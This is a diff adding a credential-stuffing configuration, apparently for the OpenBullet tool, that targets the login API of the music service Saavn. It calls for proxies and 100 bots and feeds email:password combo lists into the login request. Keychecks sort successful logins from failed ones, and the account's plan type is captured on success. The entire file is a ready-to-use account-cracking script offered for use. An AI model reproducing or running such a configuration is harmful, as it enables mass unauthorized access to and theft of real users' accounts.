@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "Saavn",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-21T10:48:12.9739242+00:00",
+  "AdditionalInfo": "Any Type of proxies will work ",
+  "Author": "Nerox",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.saavn.com/api.php?__call=user.login&_marker=0" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&&ct=841887719" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.saavn.com/login.php?action=login" 
+PARSE "<SOURCE>" LR "type='" "'" Recursive=FALSE -> CAP "Plan" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username/password. Please try again." 
+    KEY "Only a valid email address, or letters, numbers, . and _ are allowed. Usernames must be atleast 6 characters long and no more than 24." 
+  KEYCHAIN Success OR 
+    KEY "uid='" 
